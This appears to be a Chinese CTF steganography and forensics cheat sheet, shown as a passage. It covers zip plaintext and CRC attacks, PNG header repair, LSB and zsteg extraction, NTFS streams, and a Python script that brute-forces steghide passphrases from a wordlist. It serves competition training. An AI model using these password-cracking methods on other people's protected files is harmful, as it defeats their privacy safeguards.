-p logo.png -C &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;flag.zip -P &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;logo.zip -d .&#x2F;1.zip 12345678-C:要破解的目标文件(含路径)-c:破解文件中的明文文件的名字(其路径不包括系统路径,从zip文件一层开始)-P:压缩后的明文文件-p:压缩的明文文件中明文文件的名字(也就是readme.txt在readme.zip中的位置)-d:指定文件名及所在的绝对路径，将解密后的zip文件输出 CRC爆破高度修改图片高度，当图片高度出现问题的时候，我们需要根据CRC值爆破出高度，修改高度拿到flag。并且图片高度出现问题的时候，在linux下，图片无法正常打开。 使用脚本根据CRC的值爆破出正常的高度 12345678910111213141516import structimport binasciiimport osp=0m = open(&quot;flag.png&quot;,&quot;rb&quot;).read()for i in range(5000): if(p==1): break for j in range(5000): c = m[12:16] + struct.pack(&#x27;&gt;i&#x27;, i) + struct.pack(&#x27;&gt;i&#x27;, j)+m[24:29] crc = binascii.crc32(c) &amp; 0xffffffff if crc == 0x3d9a65d0: p=1 #print(c) print(hex(i),hex(j)) break CRC爆破文件内容CRC校验实用程序库，在数据存储和数据通讯领域，为了保证数据的正确，就不得不采用检错的手段。 在诸多检错手段中，CRC是最著名的一种。CRC的全称是循环冗余校验。 在产生CRC32时，源数据块的每一位都参与了运算，因此即使数据块中只有一位发生改变也会得到不同 的CRC32值，利用这个原理我们可以直接爆破出加密文件中的内容。 每个文件都有唯一的CRC32值，即便数据中一个bit发生变化，也会导致CRC32值不同。若是知道一段数 据的长度和CRC32值，便可穷举数据，与其CRC32对照，以此达到暴力猜解的目的。但限于CPU的能 力，通常只适用于较小文本文件。 通常情况下加密文件一般比较小，可以爆破CRC的值。而且爆破crc的位数通常与文件的大小有关。 编写脚本12345678910import stringimport binasciis=string.printablec =[0xF3B61B38,0xF3B61B38,0X6ABF4A82,0X5ED1937E,0X09b9265b,0x84b12bae,0x70659eff,0x90b077e1,0x6abf4a82]password = &#x27;&#x27;for crc in c: for i in s: if crc==(binascii.crc32(i.encode())&amp;0xffffffff): password =password + iprint(password) 自动提取文件的CRC值。 1234567891011import zipfileimport binasciiimport strings=string.printablef = zipfile.ZipFile(&quot;flag.zip&quot;)l = f.namelist()for i in l: for j in s: if &quot;.txt&quot; in i: if(f.getinfo(i).CRC==binascii.crc32(j.encode())): print(j) 1234567891011121314151617181920212223242526import zipfileimport stringimport binasciidef CrackCrc(crc): for i in dic: for j in dic: for p in dic: for q in dic: s = i + j + p + q if crc == (binascii.crc32(s) &amp; 0xffffffff): f.write(s) returndef CrackZip(): for I in range(68): file = &#x27;123/out&#x27; + str(I) + &#x27;.zip&#x27; f = zipfile.ZipFile(file, &#x27;r&#x27;) GetCrc = f.getinfo(&#x27;data.txt&#x27;) crc = GetCrc.CRC CrackCrc(crc)dic = string.ascii_letters + string.digits + &#x27;+/=&#x27;f = open(&#x27;out.txt&#x27;, &#x27;w&#x27;)CrackZip()f.close() crc32.py1234567891011121314151617python3 crc32.py reverse 0x15b895884 bytes: &#123;0xc9, 0xbf, 0xd6, 0x30&#125;verification checksum: 0x15b89588 (OK)alternative: AKjKcy (OK)alternative: BVptH1 (OK)alternative: FRmuIR (OK)alternative: Ka6j7X (OK)alternative: ND4JDn (OK)alternative: SgZWO3 (OK)alternative: WcGVNP (OK)alternative: _iQ5Bx (OK)alternative: bYCMs4 (OK)alternative: c5qQli (OK)alternative: d093GV (OK)alternative: oKFBdr (OK)alternative: shint6 (OK)//敏感字符alternative: wltouU (OK) 会列举出文件内容，这时候我们需要找到敏感字符。 暴力破解使用暴力破解的时候，如果我们无法载入文件，如图 我们可以使用winRAR工具进行压缩包修复。 掩码攻击 关于压缩包的十六进制十六进制反序使用脚本反序 12345678steady_str=&#x27;4B50040300140009000872D74F55439F46CE0034000000260000000800006C666761742E7478C21C1AF9380F7F03C962F53BED1B5385CA595270F34D7C254B8FC92A76A115C99800EFAA55BF064FF3E37E7CF843E767B1DB813A4B500807439F46CE00340000002600004B500201001F00140009000872D74F55439F46CE00340000002600000008002400000000000000200000000000006C666761742E7478000A0020000000000001001844B9F4F387D701D53904C216855101D53904C216855101D54B5006050000000000010001005A0000006A000000800D09200A20200D20200A0A0D09200D20200A0A0D2009202009200A0D20200A0D20200D20090A202020200D09200A20200D20200A0D09200A20090D20200A09200D20090A202020200D09200A09090D20200A09090A0D20090D20090A202020200D09200A20200A0D20090D20090A0D20200A0D20200A20200A0D200920090A0D47646C686D6374555861744D47617346695A77313264745132636C686E62704E&#x27;flag=&quot;&quot;for i in range(0,len(steady_str),4): steady_str1=steady_str[i:i+4] steady_str2=steady_str1[0:2] steady_str3=steady_str1[2:4] flag+=steady_str3+steady_str2print(flag) 直接使用winhex反序 十六进制异或题目会提示0ff，十六进制与0xff异或。 使用脚本异或、或者winhex功能(如上)。 压缩包中藏有数据01editoer使用该软件打开如果提示载入错误，说明该压缩包藏有文件。使用binwalk等等进行分离。 压缩包NTFS隐写压缩包也可能会有NTFS隐写，使用win命令dir /r或者lads.exe查看是否有NTFS隐写。 总结1、有时候压缩包打不开、压缩包有密码，可以直接使用rar进行解压，如果要求输入密码可以直接空密码就可以解压出文件。 2、压缩包如果有注释，winhex中的ascii会有CMT字段。 画图三坐标画图判断坐标大小，求出图片的长度和宽度。 首先notepad++求行号。 其次python脚本求图片大小。 1234567a=61366for i in range(0,1000): for j in range(0,1000): if (i*j)==a: print(i,j)(122, 503)(503, 122) 然后脚本画图。 12345678910111213from PIL import Imagex=503y=122img=Image.new(&quot;RGB&quot;,(x,y))file1=open(&#x27;./1.txt&#x27;,&#x27;r&#x27;)for i in range(0,x): for j in range(0,y): line=file1.readline().replace(&#x27;\\n&#x27;,&#x27;&#x27;).split(&#x27;,&#x27;) print(line) img.putpixel((i,j),(int(line[0]),int(line[1]),int(line[2])))img.show() 01二维码1234567891011121314from PIL import ImageMAX = 25img = Image.new(&quot;RGB&quot;,(MAX,MAX))str=&quot;1111111011100111101111111100000101011101000100000110111010010010010010111011011101010000110001011101101110101110110110101110110000010011011001010000011111111010101010101111111000000000011100110000000010000011010010111100110111010010110101100001001101100110100100111101111111111111100000000001101101110100101110100101101001011011011001000100100111111100111111111110110010000000010000011110111100110110010111111010110111111000100000000011101111000110101111111010101100101011011100000100011001110001011110111010010111101111101001011101000011101000110111101110100101000110000111010000010000100100100011101111111010110010101011111&quot;i = 0for y in range (0,MAX): for x in range (0,MAX): if(str[i] == &#x27;1&#x27;): img.putpixel([x,y],(0, 0, 0)) else: img.putpixel([x,y],(255,255,255)) i = i+1img.show()img.save(&quot;flag.png&quot;) 使用kali工具扫描二维码拿到flag，如果二维码太小，可以放大截图，然后继续扫描。 1steady@steady:~$ zbarimg &quot;&#x2F;home&#x2F;steady&#x2F;桌面&#x2F;1.png&quot; &gt;&gt; 1.txt QR-Code:flag&#123;bin_2_qrcode&#125; 分割图片批量扫描二维码12345678from PIL import Imageimport osid = 0for i in range(0, 25): for j in range(0, 25): box = (25 * i, 25 * j, 25 * (i + 1), 25 * (j + 1)) im.crop(box).resize((500, 500), Image.ANTIALIAS).save(&#x27;C:/Users/12521/Desktop/CTF脚本/图片二维码/分割二维码/1/%03d.png&#x27; % id) id += 1 1steady@steady:~$ for i in &#123;0..624&#125;;do zbarimg &quot;./$i.png&quot;;done &gt;&gt; qr.txt 上下左右画图R-right L-left U-up D-down 1234567891011121314151617181920212223242526272829import numpy as nps=&#x27;DDDDDDDDDRRRRRRDDDDDDDDDDDDDDDDLLLDDDDDDDDDDDLLRRRRLLDDDDDDDDDDDDDDDDDDDDDDDDUUUUUUUUUUUUUUUUUUUURRRRRRRUUUUUUUUUUUUUUUDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDUUUUUUUUUUUUUUUUUUUURRRRRRRRUUUUUUUUUUULLLLLRRRRRRLDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLUUUUUUUUUUUUUURRRRUUUUURRRRRUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUDDDDDDDDDDDDDDDDDDDRRRRRRLDDDDDDDDDDDDDLLLLLLLRRRRRRRRLUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUUURRLLDDDDDDDDDDDDDDDDDDDDDDLLDDDDRRDDDDDDDDDDDDDDDDDDDDDDDRRLLUUUUUUUUUUUUUUUUUUUUUUULLUUUURRUUUUURRRRRRRRUUUUUUUUUUULLLLLRRRRRRLDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLUUUUUUUUUUUUUURRRRUUUUURRRRDDDDDDDDDDDDDDDDDDDDDDRRRRRLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDRRRUUUUUUUUUUUUUUUURRRRLLLLDDDDDDDDDDDDDDDDRRRRDDDDDDDDDDDDDDDDDDDDDDLLLLRRRRUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRRRRRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLRRRRRUUUUUUUUUUUUUUUUUUUUUURRRRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLRRRRRUUUUUUUUUUUUUUUUUUUUUURRUUUUUUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRRRRRRUUUUUUUUUUUUUUUUUUUUULLLRRRDDDDDDDDDDDDDDDDDDDDDDDDRRDDDDLLDDDDDDDDDDDDDDDDDDDDLLL&#x27;flag =np.zeros((199,100))x=0y=0for i in range(len(s)): if(s[i]==&#x27;D&#x27;): y=y+1 flag[x][y]=&#x27;1&#x27; elif(s[i]==&#x27;U&#x27;): y=y-1 flag[x][y]=&#x27;1&#x27; elif(s[i]==&#x27;R&#x27;): x=x+1 flag[x][y]=&#x27;1&#x27; elif(s[i]==&#x27;L&#x27;): x=x-1 flag[x][y]=&#x27;1&#x27;f = open(&#x27;flag.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;)for j in range(100): s=&#x27;&#x27; for z in range(199): if(str(flag[z][j])==&#x27;0.0&#x27;): s+=&#x27; &#x27; else: s+=&#x27;x&#x27; f.write(s) f.write(&#x27;\\n&#x27;)f.close 12345678910111213141516171819from PIL import Imageim = Image.new(&#x27;RGB&#x27;,(1000,1000),&#x27;black&#x27;) #把flag中的字母读出来line = &quot;DDDDDDDDDRRRRRRDDDDDDDDDDDDDDDDLLLDDDDDDDDDDDLLRRRRLLDDDDDDDDDDDDDDDDDDDDDDDDUUUUUUUUUUUUUUUUUUUURRRRRRRUUUUUUUUUUUUUUUDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDUUUUUUUUUUUUUUUUUUUURRRRRRRRUUUUUUUUUUULLLLLRRRRRRLDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLUUUUUUUUUUUUUURRRRUUUUURRRRRUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUDDDDDDDDDDDDDDDDDDDRRRRRRLDDDDDDDDDDDDDLLLLLLLRRRRRRRRLUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUUURRLLDDDDDDDDDDDDDDDDDDDDDDLLDDDDRRDDDDDDDDDDDDDDDDDDDDDDDRRLLUUUUUUUUUUUUUUUUUUUUUUULLUUUURRUUUUURRRRRRRRUUUUUUUUUUULLLLLRRRRRRLDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLUUUUUUUUUUUUUURRRRUUUUURRRRDDDDDDDDDDDDDDDDDDDDDDRRRRRLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDRRRUUUUUUUUUUUUUUUURRRRLLLLDDDDDDDDDDDDDDDDRRRRDDDDDDDDDDDDDDDDDDDDDDLLLLRRRRUUUUUUUUUUUUUUUUUUUUUURRRRRUUUUUUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRRRRRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLRRRRRUUUUUUUUUUUUUUUUUUUUUURRRRRRRUUUUUUUUUUUUUUUULLLLLRRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLRRRRRUUUUUUUUUUUUUUUUUUUUUURRUUUUUUUUUUUUUUUURRRRRDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDLLLLLUUUUUUUUUUUUUUUUUUUUUURRRRRRRRRRUUUUUUUUUUUUUUUUUUUUULLLRRRDDDDDDDDDDDDDDDDDDDDDDDDRRDDDDLLDDDDDDDDDDDDDDDDDDDDLLL&quot;a = [300,300] #起始位置#把flag[0]当做左右移动 flag[1]当做上下移动for i in line: if i == &#x27;D&#x27;: a[1] = a[1]+1 if i == &#x27;U&#x27;: a[1] = a[1]-1 if i == &#x27;R&#x27;: a[0] = a[0]+1 if i == &#x27;L&#x27;: a[0] = a[0]-1 im.putpixel(a ,(255,255,255)) ## putpixel是通过坐标点来进行画图##刚开始是按照惯例 让i == &#x27;u&#x27; +1 画出来是个倒立的图形 所以只能让 ‘D&#x27;+1print(a)im.show() 二坐标画图kali的gnuplot,主要该工具去需要去掉（）、以及逗号变成空格。 python脚本。 图片compare比较两张图片是否有异同。 1compare &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;1.png&#39; &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;2.png&#39; out.png 查看得到的图片有什么异常。 diif比较两张图片的不同，并显示十六进制。 1diff -a a.jpg b.jpg|hexdump -C wbs43openbmp文件解密。 hexdump查看文件十六进制。 1hexdump -C flag.png webp cwebp - 编码器工具：可将 png 转为 webp 1cwebp 1.png -o 2.webp dwebp - 解码器工具：可将 webp 转为 png 1dwebp 1.webp -o 2.png vwebp - 查看器工具：可直接查看 webp 格式图片 1vwebp 1.webp webpinfo - 格式查看工具：可打印出 WebP 文件的块级结构以及基本完整性检查 1webpinfo 1.webp exiftools查看图片元数据可以查看图片信息–数据可以包括诸如相机型号，闪光灯是否闪光，日期，时间甚至GPS坐标之类的信息。 比较重要的数据为XP Comment 1exiftool flag.jpg 批量提取元数据1exiftool * | grep &quot;flag&quot; 123456789101112131415161718import osimport reimgs = os.listdir(&#x27;.&#x27;)print(imgs)imgs = [img for img in imgs if &#x27;.jpg&#x27; in img]for img in imgs: exif_dict = dict()# img=re.sub(r&#x27;[(|)]&#x27;,&#x27;&#x27;,img) exif = os.popen(&#x27;exiftool &#x27; + &#x27;&quot;&#x27; + img + &#x27;&quot;&#x27;).read() exif = exif.split(&#x27;\\n&#x27;) for ex in exif: ex = ex.split(&#x27;:&#x27;) if len(ex) == 2: exif_dict[ex[0].strip()] = ex[1].split() if &#x27;XP Comment&#x27; in exif_dict: print(exif_dict[&#x27;XP Comment&#x27;]) 提取缩略图XnView软件直接查看缩略图。 可以查看图片信息同时也可以缩略图提取，缩略图的最大特点就是两张图片都能在win和linux正常显示，但是在linux中图片会显示出别的信息。 1exiftool -b -ThumbnailImage delta.jpg &gt; flag.jpg winhex与01editor正常情况丢入之后可以看到图片对应的ascii，其中可能藏有flag、base64等编码。 有时候需要修补文件头或者修补文件尾部。(通常是直接在头部或者尾部修补) 特殊情况特别情况下一个文件中可能会夹杂着其他的文件，可以使用binwalk分离。 有时候会藏有其他文件，但是其他文件的头部或者是尾部可能损坏或者缺失，binwalk分离不出来，需要我们手动找到需要 修改的部位，然后进行相应的修补。并且需要修改的地方不会是在头部或者尾部，而是大量文本的中间部分，这就是需要 我们先去搜索相应的敏感特殊字符或者十六进制。在搜索的时候，也可以尝试搜索某些文件的尾部，文件尾部结束之后就 会对应某些文件的头部，比如： RAR的头部十六进制为：526172211A，对应的ascii为：Rar!。 PNG的头部十六进制为：89504E470D0A1A0A0000000D，对应的ascii为 PNG，有时候文件损坏，头部的数据并不会有 PNG，这时候我们可以搜索PNG特有的ascii—-IHDR,在PNG的尾部，也会特有IEND。尾部十六进制为：49454E44AE426082。 GIF的头部十六进制为：4749463839，对应的ascii为：GIF89a。 还有其他文件格式，就不一一列出。 图片模糊处理 修改宽度和高度JPG文件修改图片高度和宽度搜索FFC0后的第四到七的字节就是图片的宽和高度。 PNG文件修改图片高度宽度正常修改右键查看图片属性，查到长度和宽度，然后转换十六进制，搜索，修改对应的宽度、高度，然后修改成对应的十六进制。 CRC爆破修改根据CRC爆破出正常的高度和宽度，进而进行修改。 图片锐化12345678910111213141516171819202122#coding:utf-8import Imageimg = Image.open(&#x27;ifs.bmp&#x27;)X = img.size[0]Y = img.size[1]print X,Yfor i in range(X-2): for j in range(Y-2): a = img.getpixel((i,j))[0]+img.getpixel((i,j))[1]+img.getpixel((i,j))[2] b = img.getpixel((i,j+1))[0]+img.getpixel((i,j+1))[1]+img.getpixel((i,j+1))[2] c = img.getpixel((i,j+2))[0]+img.getpixel((i,j+2))[1]+img.getpixel((i,j+2))[2] if (a &gt; b and c &gt; b) or (a &lt; b and c &lt; b): pass else: img.putpixel((i,j),(255,255,255))img.show() LSB隐写lsb.py在debain8的虚拟机上 123root@root:~/桌面/cloacked-pixel-master# python2 lsb.py extract 11.png 1.txt 123456[+] Image size: 331x300 pixels.[+] Written extracted data to 1.txt. 八位二进制最低有效位隐写这里要注意图片的模式。如果为L就必须要注意。而且图片是png或者bmp,不能是jpg。 取每个坐标的像素，然后转换成二进制，然后与1异或得到的0或1就是隐藏的信息，将0或1转换得到flag，比如转换为二维码或者直接转成字符串。 stegsolve最常见的是两张图片进行xor，一定要注意xor的顺序，先打开某一个文件，然后两者在xor，顺序是有影响的。 每个通道的0位置，把每个0位置保存下来进行xor。 直接提取信息–data extract，这里配合zsteg。 从图片中提取flag图片中隐约的有flag这时候我们需要使用脚本去根据rgb值提取flag。 12345678910111213from PIL import Imageimg = Image.open(&#x27;hide.png&#x27;)w = img.widthh = img.heightimg_obj = Image.new(&quot;RGB&quot;,(w//16,h//16))for x in range(w//16): for y in range(h//16): (r,g,b)=img.getpixel((x*16,y*16)) img_obj.putpixel((x,y),(r,g,b))img_obj.save(&#x27;ok.png&#x27;) Binwalk1# binwalk flag.jpg binwalk自动分析文件： 123456789# binwalk flag.jpg DECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 JPEG image data, JFIF standard 1.01382 0x17E Copyright string: &quot;Copyright (c) 1998 Hewlett-Packard Company&quot;3192 0xC78 TIFF image data, big-endian, offset of first image directory: 8140147 0x22373 JPEG image data, JFIF standard 1.01140177 0x22391 TIFF image data, big-endian, offset of first image directory: 8 jpg文件还隐藏着另一个jpg文件，从140147块偏移开始就是另一张jpg。 使用dd命令分离1# dd if&#x3D;flag.jpg of&#x3D;flag-1.jpg skip&#x3D;28673 bs&#x3D;1 1234if是指定输入文件of是指定输出文件skip是指定从输入文件开头跳过140147个块后再开始复制bs设置每次读写块的大小为1字节 使用foremost工具分离1foremost flag.jpg JPHS针对jpg行为，有时候需要密码，有时候直接空密码。 盲水印普通盲水印1python3 bwmforpy3.py decode hui.png hui_with_wm.png wm_from_hui.png --oldseed 123456bwm.py 程序文件python2版本bwmforpy3.py 程序文件python3版本hui.png 无水印的原图wm.png 水印图hui_with_wm.png 有盲水印的图wm_from_hui.png 反解出来的水印图 频域盲水印脚本 1python pinyubwm.py --original 1.png --image 2.png --result out.png NTFS隐写NTFS交换数据流（alternate data streams，简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。它使用资源派生来维持与文件相关的信息，虽然我们无法看到数据流文件，但是它却是真实存在于我们的系统中的。创建一个数据交换流文件的方法很简单，命令为”宿主文件:准备与宿主文件关联的数据流文件”。 利用方式 使用winrar解压文件，然后使用工具扫描，会直接看到解压的文件。一定要先使用winrar解压文件。 可以使用工具对文件进行检测，查看是否存在ntfs隐写。 123456789101112131415F:\\CTF-tools\\NTFS&gt;lads.exe /SLADS - Freeware version 4.10(C) Copyright 1998-2007 Frank Heyne Software (http://www.heysoft.de)This program lists files with alternate data streams (ADS)Use LADS on your own risk!Scanning directory F:\\CTF-tools\\NTFS\\ with subdirectories size ADS in file---------- --------------------------------- 23 F:\\CTF-tools\\NTFS\\a.jpg:flag1.txt 1064 F:\\CTF-tools\\NTFS\\a.jpg:Zone.Identifier 1087 bytes in 2 ADS listed 或者使用cmd命令来查看是否存在隐写 12345678910111213141516171819F:\\CTF-tools\\NTFS&gt;dir /r 驱动器 F 中的卷是 新加卷 卷的序列号是 BE8A-2731 F:\\CTF-tools\\NTFS 的目录2020/10/27 11:19 &lt;DIR&gt; .2020/10/27 11:19 &lt;DIR&gt; ..2020/02/17 16:09 31,469 a.jpg 23 a.jpg:flag1.txt:$DATA 1,064 a.jpg:Zone.Identifier:$DATA2007/01/04 04:10 61,952 lads.exe2020/10/22 14:50 952,930 ntfsstreamseditor.exe2007/04/27 10:17 87,424 streams.exe2020/10/27 11:15 3,403,439 test.mp4 131 test.mp4:Zone.Identifier:$DATA2020/10/27 11:19 3,379,226 test.rar 6 个文件 7,916,440 字节 2 个目录 82,187,112,448 可用字节 然后可以使用工具进行数据提取，7z压缩工具可以看到是否有隐写数据。 notepad1notepad 1.txt:flag.txt 直接可以看到文件，可以使用strings命令来查看是否有ntfs隐写。 stegdetectstegdetect可以检测jpg通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写。 检测隐写方式 1检查jpg图片隐写方法_win 12345678stegdetect.exe -tjopi -s 10.0 [stego_file]-s 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。-t 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：j 检测图像中的信息是否是用jsteg嵌入的。o 检测图像中的信息是否是用outguess嵌入的。p 检测图像中的信息是否是用jphide嵌入的。i 检测图像中的信息是否是用invisible secrets嵌入的。 暴力破解密码 1python steg_brute.py -b -d [字典] -f [jpg_file] stegbreak 12345stegbreak -r rules.ini -f password.txt -t p [stego_file]# password.txt为自带字典Loaded 1 files...[stego_file]：jphide[v5](2333)# 2333为该文件jphide的密码 stegpy1&#x2F;home&#x2F;steady&#x2F;.local&#x2F;bin&#x2F;stegpy &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;1.webp -p 提取信息 1stegpy _image.png 带口令提取信息 1stegpy _image.png -p outguess12345678加密：outguess -k “my secret key” -d hidden.txt demo.jpg out.jpg加密之后，demo.jpg会覆盖out.jpg,hidden.txt中的内容是要隐藏的东西解密：outguess -k 123456 -r 4.jpg hidden.txt解密之后，解密内容放在hidden.txt中 F5隐写1234F5隐写加密：java Embed 原图片.jpg 生成的图片.jpg -e 隐藏的文件.txt -p 密码F5隐写解密：java Extract 生成的图片.jpg -p 密码 图片十六进制处理比如直接逆序十六进制，或者与其他数据异或，这里可以借助winhex功能。 zstegzsteg可以检测PNG和BMP图片里的隐写数据。 常用参数123$ zsteg 1.bmp --bits 1 --channel r --lsb --order xy --limit 2048$ zsteg 1.bmp --bits 1 --channel g --lsb --order xy --limit 2048$ zsteg 1.bmp --bits 1 --channel b --lsb --order xy --limit 2048 12345--bits 1：每次只摘取颜色通道中的第 1 个比特。--channel r：只摘取红色通道的比特位。--lsb：按最低有效位优先的顺序进行摘取。--order xy：按照从左至右、从上至下的顺序对图像素点进行摘取。--limit 2048：最多摘取输出 2048 字节。 导出文件1zsteg -e &quot;b1,bgr,lsb,xy&quot; pcat.png &gt; p.exe 显示细节123456789101112131415161718steady@steady:~&#x2F;桌面&#x2F;steady$ zsteg &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;png&#x2F;hide.png -vb2,bgr,msb,xy .. text: &quot;Wz]Wz]iz&quot; 00000000: 74 9a 5e 29 cf f3 a9 c0 a7 fc 75 5d 82 90 a6 57 |t.^)......u]...W| 00000010: 7a 5d 57 7a 5d 69 7a ed c4 3c 77 5d 37 23 26 d2 |z]Wz]iz..&lt;w]7#&amp;.| 00000020: cd 5d 67 76 b1 47 2e 24 e9 2d f1 42 c6 8b 47 92 |.]gv.G.$.-.B..G.| 00000030: 2e 41 ec fb ee 12 ae eb 46 84 bb 47 11 e1 ee 04 |.A......F..G....| 00000040: 11 11 44 44 44 44 e4 ba 71 4c 92 6a 45 ad d4 fa |..DDDD..qL.jE...| 00000050: 57 a3 dd 2c 8b c0 0b a8 d5 5b c2 c5 5f 57 ba 9c |W..,.....[.._W..| 00000060: b1 61 18 96 35 a0 70 c9 e6 39 8b b3 28 00 a8 aa |.a..5.p..9..(...| 00000070: aa aa 3f 50 01 95 aa 0e fd 77 1c ff ff 57 e9 29 |..?P.....w...W.)| 00000080: ff ed c8 f4 7d 6b 18 ec 61 b4 53 cb 25 26 d2 75 |....&#125;k..a.S.%&amp;.u| 00000090: cb 22 73 5d a7 bf bb ab bf f3 9c 78 a9 65 0d 02 |.&quot;s].......x.e..| 000000a0: 1f 11 9e 32 0c e2 ad 07 18 f9 5a c9 3c 7b 14 97 |...2......Z.&lt;&#123;..| 000000b0: bd 38 ee d9 09 89 b3 9d e9 29 a7 62 4c 9b a3 8b |.8.......).bL...| 000000c0: 15 17 f8 7c 0a bd e2 7d 8b 65 39 b0 36 17 86 96 |...|...&#125;.e9.6...| 000000d0: e5 31 2d 9a bc a9 70 2b eb 08 a8 17 0f 85 5b 8b |.1-...p+......[.| 000000e0: 81 f6 2d f8 54 7b e4 c7 01 c3 1e 69 db 15 50 a9 |..-.T&#123;.....i..P.| 000000f0: a3 8d d9 df c7 4a c3 a0 eb ba be fa c7 c1 1e 6a |.....J.........j| 查看LSB信息1zsteg flag.png 第二个参数就是rgb，这里只有r，代表红色的0号通道藏有PNG，我们打开stegsolve的red 0通道可以看到有PNG信息。 12b1,r,lsb,xy .. file: PNG image data, 526 x 298, 8-bit/color RGB, non-interlacedb1,bgr,msb,xy .. text: &quot;C2dB2IH&amp;$&quot; 提取图片中的信息 有时候我们直接提取会提取出一半数据，这时候我们直接使用-l参数设置我们提取信息的长度。 1zsteg warmup.bmp b1,r,lsb,xy -l 2048 --all参数1root@root:~&#x2F;桌面&#x2F;flag&#x2F;套娃# zsteg &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;套娃&#x2F;2&#x2F;3&#x2F;4&#x2F;5&#x2F;6&#x2F;warmup.bmp&#39; --all ImageMagickImageMagick是一个免费的开源，功能丰富，基于文本和跨平台的图像处理工具，用于创建，编辑，编写或转换位图图像。 它可在Linux，Windows，Mac Os X，iOS，Android OS和许多其他操作系统上运行。 identify提取每一帧的间隔间隔时间转成0或者1，拿到flag。 1identify -format &quot;%T\\n&quot; *.gif&gt;1.txt 查看图片详情1identify example.png 从指定文件中获取缩略图： 1steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;jpg$ exiftool -b -ThumbnailImage &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;hekkerman.jpg&gt; thumbnail.jpg steghide解密多用于jpg文件。 1steghide.exe extract -sf flag.jpg 1steghide extract -sf 1.jpg -p 123456 破解密码1python steg_brute.py -b -d [字典] -f [jpg_file] 或者–kali有文件夹 12345678910111213141516171819202122232425262728from subprocess import *def foo(): stegoFile=&#x27;thing.jpg&#x27; extractFile=&#x27;hide.txt&#x27; passFile=&#x27;english.dic&#x27; errors=[&#x27;could not extract&#x27;,&#x27;steghide --help&#x27;,&#x27;Syntax error&#x27;] cmdFormat=&#x27;steghide extract -sf &quot;%s&quot; -xf &quot;%s&quot; -p &quot;%s&quot;&#x27; f=open(passFile,&#x27;r&#x27;) for line in f.readlines(): cmd=cmdFormat %(stegoFile,extractFile,line.strip()) p=Popen(cmd,shell=True,stdout=PIPE,stderr=STDOUT) content=unicode(p.stdout.read(),&#x27;gbk&#x27;) for err in errors: if err in content: break else: print content, print &#x27;the passphrase is %s&#x27; %(line.strip()) f.close() returnif __name__ == &#x27;__main__&#x27;: foo() print &#x27;ok&#x27; pass stegcracker1steady@steady:~&#x2F;桌面$ &#x2F;home&#x2F;steady&#x2F;.local&#x2F;bin&#x2F;stegcracker 有时候也可以破解音频。 123steady@steady:~&#x2F;桌面&#x2F;steady$ steghide extract -sf out.wavEnter passphrase: wrote extracted data to &quot;download.txt&quot;. stepic提取数据 1steady@steady:~$ stepic --decode --image-in&#x3D;&#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;1.png --out&#x3D;output.txt 转jpg 1steady@steady:~&#x2F;桌面&#x2F;steady$ stepic -i &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;png&#x2F;00001069.png -d &gt; thing stegoveritas一键查看文件信息。 1&#x2F;home&#x2F;steady&#x2F;.local&#x2F;bin&#x2F;stegoveritas flag.jpg extundelete恢复文件。 1extundelete --restore-all corrupt-file.img 